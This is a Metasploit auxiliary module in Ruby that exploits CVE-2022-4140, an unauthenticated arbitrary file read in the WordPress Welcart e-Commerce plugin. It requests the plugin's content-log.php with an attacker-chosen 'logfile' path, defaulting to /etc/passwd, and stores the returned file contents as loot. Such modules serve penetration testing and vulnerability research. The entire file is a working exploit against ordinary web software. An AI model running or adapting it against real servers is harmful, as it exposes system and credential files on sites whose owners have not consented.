##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Wordpress
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Welcart e-Commerce Arbitrary File Read (CVE-2022-4140)',
        'Description' => %q{
          This module exploits an arbitrary file read vulnerability in Wordpress's Welcart e-Commerce plugin versions prior to 2.8.5.
          The plugin's content-log.php file does not validate user input before using it to output the content of logfiles.
          This allows unauthenticated attackers to access the vulnerable endpoint directly and read arbitrary files on the server.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Takeshi Suzuki', # CVE author
          'sinn3r', # Exploit author, used sinn3r's yaws_traversal exploit module as a skeleton
          'Balachandar Gowrisankar' # Exploit author
        ],
        'References' => [
          ['CVE', '2022-4140']
        ],
        'DisclosureDate' => '2022-12-05',
        'Notes' => {
          'Reliability' => [REPEATABLE_SESSION],
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The name of the file to download', '/etc/passwd']),
        OptString.new('TARGETURI', [true, 'Base path to WordPress installation', '/'])
      ]
    )
  end

  def check
    check_plugin_version_from_readme('usc-e-shop', '2.8.5')
  end

  def run
    # Check whether server is reachable and WordPress is installed
    unless wordpress_and_online?
      print_error('Server not online or not detected as WordPress')
      return
    end

    # Check if filename is specified
    if datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?
      print_error('Please supply the name of the file you want to download')
      return
    end

    # Create request
    route = normalize_uri(
      datastore['TARGETURI'],
      'wp-content',
      'plugins',
      'usc-e-shop',
      'functions',
      'content-log.php'
    )

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => route,
      'vars_get' => {
        'logfile' => datastore['FILEPATH']
      }
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'No HTTP response received')
    elsif res.code != 200
      fail_with(Failure::UnexpectedReply, "Unexpected HTTP status: #{res.code} while attempting to read file")
    end
    if res.body.empty?
      fail_with(Failure::Unreachable, 'File does not exist')
    end

    fname = File.basename(datastore['FILEPATH'])

    path = store_loot(
      'welcart.http',
      'application/octet-stream',
      datastore['RHOST'],
      res.body,
      fname
    )
    print_status("File saved to: #{path}")
  end
end
